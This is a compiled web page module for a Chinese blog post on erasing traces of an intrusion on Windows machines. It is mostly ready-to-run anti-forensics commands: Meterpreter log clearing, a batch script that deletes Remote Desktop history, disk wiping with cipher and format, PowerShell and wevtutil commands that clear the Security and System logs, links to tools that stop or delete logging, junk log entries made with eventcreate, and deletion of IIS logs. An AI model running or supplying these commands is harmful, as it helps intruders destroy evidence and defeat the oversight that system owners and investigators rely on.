import{_ as i,c as l,b as a,a as n,d as s,e as r,r as d,o as p}from"./app-CUDFWA7u.js";const o={},c={href:"https://cloud.tencent.com/document/product/440/6176",target:"_blank",rel:"noopener noreferrer"};function u(m,e){const t=d("ExternalLinkIcon");return p(),l("div",null,[e[3]||(e[3]=a(`<h1 id="windows-入侵痕迹清理" tabindex="-1"><a class="header-anchor" href="#windows-入侵痕迹清理"><span>Windows 入侵痕迹清理</span></a></h1><h2 id="metasploit" tabindex="-1"><a class="header-anchor" href="#metasploit"><span>Metasploit</span></a></h2><p>查看事件日志</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> run event_manager <span class="token parameter variable">-i</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>清除事件日志</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> run event_manager  <span class="token parameter variable">-c</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>从应用、系统、安全模块三个方面清理历史记录</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> clearev</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="remote-desktop" tabindex="-1"><a class="header-anchor" href="#remote-desktop"><span>Remote Desktop</span></a></h2><p>clearRD.bat</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">@echo off</span>
<span class="line">reg delete <span class="token string">&quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot;</span> /va /f</span>
<span class="line">reg delete <span class="token string">&quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;</span> /f</span>
<span class="line">reg <span class="token function">add</span> <span class="token string">&quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;</span></span>
<span class="line"><span class="token builtin class-name">cd</span> %userprofile%<span class="token punctuation">\\</span>documents<span class="token punctuation">\\</span></span>
<span class="line">attrib Default.rdp <span class="token parameter variable">-s</span> <span class="token parameter variable">-h</span></span>
<span class="line">del Default.rdp</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="hard-disk" tabindex="-1"><a class="header-anchor" href="#hard-disk"><span>Hard Disk</span></a></h2><p>clearHD.bat</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">cipher /w:D:<span class="token punctuation">\\</span>tools		% 三次擦写 %</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token function">format</span> D: /P:8			% 清零再<span class="token punctuation">(</span><span class="token number">8</span>次<span class="token punctuation">)</span>擦写 %</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="事件日志" tabindex="-1"><a class="header-anchor" href="#事件日志"><span>事件日志</span></a></h2><p>清理：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">PowerShell -Command &quot;&amp; {Clear-Eventlog -Log Application,System,Security}&quot;</span>
<span class="line"></span>
<span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname}</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>停止日志记录：https://github.com/hlldz/Invoke-Phant0m</p><p>删除指定日志：https://github.com/QAX-A-Team/EventCleaner</p><p><strong>伪造日志</strong></p>`,21)),n("p",null,[e[1]||(e[1]=s("利用 ")),n("a",c,[e[0]||(e[0]=s("TCCLI")),r(t)]),e[2]||(e[2]=s(" eventcreate，在日志中生成大量垃圾信息。"))]),e[4]||(e[4]=a(`<div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="iis" tabindex="-1"><a class="header-anchor" href="#iis"><span>IIS</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">net stop w3svc</span>
<span class="line">cd %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\</span>
<span class="line">del *</span>
<span class="line">net start w3svc</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>清除历史</strong>：<code>del /f /s /q “%userprofile%\\Recent*.*</code></p>`,4))])}const h=i(o,[["render",u]]),b=JSON.parse('{"path":"/blogs/tech/security/net/999_Trace_Cleanup.html","title":"Windows 入侵痕迹清理","lang":"en-US","frontmatter":{"title":"Windows 入侵痕迹清理","date":"2022-09-14T00:00:00.000Z","tags":["security","networking"],"categories":["tech"]},"headers":[{"level":2,"title":"Metasploit","slug":"metasploit","link":"#metasploit","children":[]},{"level":2,"title":"Remote Desktop","slug":"remote-desktop","link":"#remote-desktop","children":[]},{"level":2,"title":"Hard Disk","slug":"hard-disk","link":"#hard-disk","children":[]},{"level":2,"title":"事件日志","slug":"事件日志","link":"#事件日志","children":[{"level":3,"title":"IIS","slug":"iis","link":"#iis","children":[]}]}],"git":{"createdTime":1766928673000,"updatedTime":1766928673000,"contributors":[{"name":"PPPerryPan","email":"perrypan0123@outlook.com","commits":1}]},"filePathRelative":"blogs/tech/security/net/999_Trace_Cleanup.md"}');export{h as comp,b as data};
